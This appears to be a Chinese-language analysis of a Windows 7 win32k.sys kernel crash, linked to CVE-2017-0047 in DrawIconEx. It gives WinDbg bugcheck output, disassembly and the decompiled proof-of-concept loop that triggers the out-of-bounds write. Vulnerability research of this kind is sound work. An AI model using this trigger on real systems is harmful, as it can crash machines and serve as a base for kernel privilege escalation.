poc.txt是个uuencode解密过的文件，用uudecode解密得到poc.zip.里边有个poc.exe.在win7 x86运行，触发崩溃

    *******************************************************************************
    * *
    *Bugcheck Analysis*
    * *
    *******************************************************************************
    
    Use !analyze -v to get detailed debugging information.
    
    BugCheck 50, {f8a00000, 1, 9395ee72, 0}
    
    *** WARNING: Unable to verify checksum for poc.exe
    *** ERROR: Module load completed but symbols could not be loaded for poc.exe
    Probably caused by : win32k.sys ( win32k!vSrcCopyS1D32+a5 )
    
    Followup: MachineOwner
    ---------
    
    nt!RtlpBreakWithStatusInstruction:
    83e7e394 cc  int 3

可以看到喷口点位于`win32k.sys ( win32k!vSrcCopyS1D32+a5 )`

运行!analyze -v命令查看详细信息

    *******************************************************************************
    * *
    *Bugcheck Analysis*
    * *
    *******************************************************************************
    
    PAGE_FAULT_IN_NONPAGED_AREA (50)
    Invalid system memory was referenced.  This cannot be protected by try-except,
    it must be protected by a Probe.  Typically the address is just plain bad or it
    is pointing at freed memory.
    Arguments:
    Arg1: f8a00000, memory referenced.
    Arg2: 00000001, value 0 = read operation, 1 = write operation.
    Arg3: 9395ee72, If non-zero, the instruction address which referenced the bad memory
    	address.
    Arg4: 00000000, (reserved)
    
    Debugging Details:
    ------------------
    
    
    WRITE_ADDRESS:  f8a00000 Paged session pool
    
    FAULTING_IP: 
    win32k!vSrcCopyS1D32+a5
    9395ee72 8918mov dword ptr [eax],ebx
    
    MM_INTERNAL_CODE:  0
    
    IMAGE_NAME:  win32k.sys
    
    DEBUG_FLR_IMAGE_TIMESTAMP:  4a5bc2a2
    
    MODULE_NAME: win32k
    
    FAULTING_MODULE: 93900000 win32k
    
    DEFAULT_BUCKET_ID:  VISTA_DRIVER_FAULT
    
    BUGCHECK_STR:  0x50
    
    PROCESS_NAME:  poc.exe
    
    CURRENT_IRQL:  2
    
    TRAP_FRAME:  8b093660 -- (.trap 0xffffffff8b093660)
    ErrCode = 00000002
    eax=f8a00000 ebx=00000000 ecx=0dead000 edx=00000000 esi=8b093880 edi=f8a2a14c
    eip=9395ee72 esp=8b0936d4 ebp=8b093700 iopl=0 nv up ei pl zr na pe nc
    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000 efl=00010246
    win32k!vSrcCopyS1D32+0xa5:
    9395ee72 8918mov dword ptr [eax],ebx  ds:0023:f8a00000=????????
    Resetting default scope
    
    LAST_CONTROL_TRANSFER:  from 83eefe71 to 83e7e394
    
    STACK_TEXT:  
    8b0931ac 83eefe71 00000003 749d2712 00000065 nt!RtlpBreakWithStatusInstruction
    8b0931fc 83ef096d 00000003 8645d908 00000000 nt!KiBugCheckDebugBreak+0x1c
    8b0935c0 83e988e3 00000050 f8a00000 00000001 nt!KeBugCheck2+0x68b
    8b093648 83e595f8 00000001 f8a00000 00000000 nt!MmAccessFault+0x106
    8b093648 9395ee72 00000001 f8a00000 00000000 nt!KiTrap0E+0xdc
    8b093700 939a7096 00093880 18b952eb 0dead000 win32k!vSrcCopyS1D32+0xa5
    8b093940 939352bd fe5c2d20 f8a2a010 00000000 win32k!EngCopyBits+0x604
    8b093a00 9393c16f 00000000 0dead000 00000006 win32k!EngRealizeBrush+0x462
    8b093a98 9393ba2c ff427c00 ffb6c748 93934e5b win32k!bGetRealizedBrush+0x70c
    8b093ab0 939af684 fd784648 fd784648 ffaa4000 win32k!pvGetEngRbrush+0x1f
    8b093b14 939b83cc ffaa4010 00000000 00000000 win32k!EngBitBlt+0x2b9
    8b093b78 939c1330 fd784648 8b093be0 8b093bd0 win32k!GrePatBltLockedDC+0x22b
    8b093c24 93999408 8b093c54 0000f0f0 8b093c88 win32k!GrePolyPatBltInternal+0x176
    8b093c60 9398a01e 05010216 00f00021 8b093c88 win32k!GrePolyPatBlt+0x45
    8b093ca8 939892e7 0a01023d 00000000 11223344 win32k!_DrawIconEx+0x153
    8b093d00 83e5642a 0a01023d 00000000 11223344 win32k!NtUserDrawIconEx+0xcb
    8b093d00 775d64f4 0a01023d 00000000 11223344 nt!KiFastCallEntry+0x12a
    0024f760 75a84ceb 75a84cd3 0a01023d 00000000 ntdll!KiFastSystemCallRet
    0024f764 75a84cd3 0a01023d 00000000 11223344 USER32!NtUserDrawIconEx+0xc
    0024f7c0 01211061 0a01023d 00000000 11223344 USER32!DrawIconEx+0x260
    WARNING: Stack unwind information not available. Following frames may be wrong.
    0024f83c 77131174 7ffd3000 0024f888 775eb3f5 poc+0x1061
    0024f848 775eb3f5 7ffd3000 77433baa 00000000 kernel32!BaseThreadInitThunk+0xe
    0024f888 775eb3c8 012112a1 7ffd3000 00000000 ntdll!__RtlUserThreadStart+0x70
    0024f8a0 00000000 012112a1 7ffd3000 00000000 ntdll!_RtlUserThreadStart+0x1b

    STACK_COMMAND:  kb
    
    FOLLOWUP_IP: 
    win32k!vSrcCopyS1D32+a5
    9395ee72 8918mov dword ptr [eax],ebx
    
    SYMBOL_STACK_INDEX:  5
    
    SYMBOL_NAME:  win32k!vSrcCopyS1D32+a5
    
    FOLLOWUP_NAME:  MachineOwner
    
    FAILURE_BUCKET_ID:  0x50_win32k!vSrcCopyS1D32+a5
    
    BUCKET_ID:  0x50_win32k!vSrcCopyS1D32+a5
    
    Followup: MachineOwner
    ---------
    
在调用函数回溯中看到了在poc中出现过的DrawIconEx函数

poc.exe在ida中表现如下：

    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      HDC v3; // edi
      HDC v4; // esi
      HICON v5; // ebx
      HBITMAP v6; // eax
      HBRUSH i; // esi
    
      v3 = GetWindowDC(0);
      v4 = CreateCompatibleDC(v3);
      v5 = LoadIconW(0, (LPCWSTR)0x7F02);
      v6 = CreateDiscardableBitmap(v4, 233492480, 1);
      for ( i = CreatePatternBrush(v6); ; DrawIconEx(v3, 0, 0x11223344, v5, 0x5566, 0x7788, 0x12345678u, i, 8u) )
    ;
    }

CreateDiscardableBitmap函数原型如下

	HBITMAP CreateDiscardableBitmap(HDC hdc, int nWidth, int nHeight)
	hdc：设备环境句柄。
	nWidth：按位来指定位图的宽度。
	nHeight：按位来指定位图的高度。

CreatePatternBrush函数

    CreatePatternBrush可以创建具有指定位图模式的逻辑刷子
    返回值：如果该函数执行成功，那么返回值标识为一个逻辑刷子

DrawIconEx函数原型

    BOOL DrawIconEx(
    	HDC hdc,
    	int xLeft,
    	int yTop,
    	HICON hIcon,
    	int cxWidth,
    	int cyWidth,
    	UINT istepIfAniCur,   // 一般为0
    	HBRUSH hbrFlickerFreeDraw,   // 一般为NULL
    	UINT diFlags// 一般为DI_NORMAL | DI_COMPAT
    );

	参数 hdc, 整数型, , 要在其中画图的一个设备场景的句柄
	参数 xLeft, 整数型, , 图标左上角的位置，用逻辑坐标表示
	参数 yTop, 整数型, , 同上
	参数 hIcon, 整数型, , 要描绘的图标的句柄
	参数 cxWidth, 整数型, , 希望的图标宽度和高度。图标会自动缩放，与指定的值相符
	参数 cyWidth, 整数型, , 同上
	参数 istepIfAniCur, 整数型, , 如果hIcon是个动画指针，那么该参数指定描绘动画中的哪幅图象。注意Win32不能区分图标和指针
	参数 hbrFlickerFreeDraw, 整数型, 如设为一个刷子句柄，那么函数会将图标画入一幅内存位图，并用背景色填充。随后，将图象直接复制到指定的位置。这样做可绘图时减少闪烁（因为画图过程中重现）
	参数 diFlags, 整数型, , 下述常数之一：
	DI_COMPAT：描绘标准的系统指针，而不是指定的图象
	DI_DEFAULTSIZE：忽略cxWidth和cyWidth设置，并采用原始的图标大小
	DI_IMAGE：绘图时使用图标的XOR部分（即图标没有透明区域）
	DI_MASK：绘图时使用图标的MASK部分（如单独使用，可获得图标的掩模）
	DI_NORMAL：用常规方式绘图（合并 DI_IMAGE 和 DI_MASK）

在poc中

    for ( i = CreatePatternBrush(v3); ; DrawIconEx(v0, 0, 0x11223344, v2, 0x5566, 0x7788, 0x12345678, i, 8) )
    ;

## 猜测：
    
    漏洞大概就是不断往CreateDiscardableBitmap生成的位图中不断绘制图标，而DrawIconEx函数没有判断出位图的大小，导致越界写入。触发崩溃

大概就是这个CVE了

    Microsoft Windows DrawIconEx缓冲区溢出特权升级漏洞
    CVE ID	CVE-2017-0047

继续分析奔溃时的汇编，看eax的值从何而来

	win32k!vSrcCopyS1D32+0x29:
	939aedf6 8955e0          mov     dword ptr [ebp-20h],edx
	939aedf9 8b5608          mov     edx,dword ptr [esi+8]
	939aedfc c1ff03          sar     edi,3
	939aedff 037e04          add     edi,dword ptr [esi+4]
	939aee02 8d0482          lea     eax,[edx+eax*4]
	939aee05 894df4          mov     dword ptr [ebp-0Ch],ecx
	939aee08 8945e8          mov     dword ptr [ebp-18h],eax
	939aee0b 85c9            test    ecx,ecx

	win32k!vSrcCopyS1D32+0x40:
	939aee0d 0f841e010000    je      win32k!vSrcCopyS1D32+0x164 (939aef31)
	939aee13 8a550b          mov     dl,byte ptr [ebp+0Bh]
	939aee16 53              push    ebx
	939aee17 8b4df0          mov     ecx,dword ptr [ebp-10h]
	939aee1a ff4df4          dec     dword ptr [ebp-0Ch]
	939aee1d 894df8          mov     dword ptr [ebp-8],ecx
	939aee20 8a4e24          mov     cl,byte ptr [esi+24h]
	939aee23 80e107          and     cl,7

	win32k!vSrcCopyS1D32+0x59:
	939aee26 897dfc          mov     dword ptr [ebp-4],edi
	939aee29 7508            jne     win32k!vSrcCopyS1D32+0x66 (939aee33)
	939aee2b 8d5fff          lea     ebx,[edi-1]
	939aee2e 895dfc          mov     dword ptr [ebp-4],ebx
	939aee31 eb04            jmp     win32k!vSrcCopyS1D32+0x6a (939aee37)
	939aee33 8a17            mov     dl,byte ptr [edi]
	939aee35 d2e2            shl     dl,cl
	939aee37 837df000        cmp     dword ptr [ebp-10h],0

	win32k!vSrcCopyS1D32+0x6e:
	939aee3b 0f84d9000000    je      win32k!vSrcCopyS1D32+0x14d (939aef1a)
	939aee41 84c9            test    cl,cl
	939aee43 0f85ae000000    jne     win32k!vSrcCopyS1D32+0x12a (939aeef7)
	939aee49 8b55f8          mov     edx,dword ptr [ebp-8]
	939aee4c ff45fc          inc     dword ptr [ebp-4]
	939aee4f 83fa08          cmp     edx,8
	939aee52 0f829a000000    jb      win32k!vSrcCopyS1D32+0x125 (939aeef2)
	939aee58 c1ea03          shr     edx,3

	win32k!vSrcCopyS1D32+0x8e:
	939aee5b 8955ec          mov     dword ptr [ebp-14h],edx
	939aee5e 8b55fc          mov     edx,dword ptr [ebp-4]
	939aee61 8a12            mov     dl,byte ptr [edx]
	939aee63 88550b          mov     byte ptr [ebp+0Bh],dl
	939aee66 0fb6d2          movzx   edx,dl
	939aee69 8bda            mov     ebx,edx
	939aee6b c1eb07          shr     ebx,7
	939aee6e 8b5c9de0        mov     ebx,dword ptr [ebp+ebx*4-20h]

	win32k!vSrcCopyS1D32+0xa5:
	939aee72 8918            mov     dword ptr [eax],ebx

